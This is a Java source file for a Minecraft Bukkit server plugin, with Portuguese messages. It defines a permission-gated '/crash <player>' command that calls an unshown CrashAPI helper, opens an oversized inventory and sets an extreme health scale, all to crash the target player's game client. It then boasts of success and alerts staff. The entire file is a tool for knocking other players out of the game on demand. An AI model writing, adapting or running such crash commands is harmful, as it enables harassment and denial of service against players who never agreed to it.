package Outfit.PvP.Commands;


import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.inventory.Inventory;



public class Crashar
  implements CommandExecutor
{
  public boolean onCommand(CommandSender s, Command cmd, String lbl, String[] args)
  {
    if (args.length != 1)
    {
      s.sendMessage("§cUtilize /crash <Jogador>");
      return true;
    }
    if (!s.hasPermission("cmd.crash")) {
    	s.sendMessage("§4§lERRO: §fVoce não tem permissão para executar esse comando.");
    	return true;
    }
    Player p = Bukkit.getPlayer(args[0]);
    if (p == null)
    {
      s.sendMessage("§eEsse jogador esta offline");
      return true;
    }
    CrashAPI.crashPlayer(p);
    Inventory inv = Bukkit.createInventory(p, 756, "§cCrash");
    p.openInventory(inv);
    p.setHealthScale(9.49592994E8D);
    s.sendMessage("§c" + p.getName() + " foi crashado com sucesso! Voce e do mal");
    Bukkit.broadcast("§c" + s.getName() + " crashou o Minecraft de " + p.getName(), "kitpvp.staff");
    return true;
  }
}
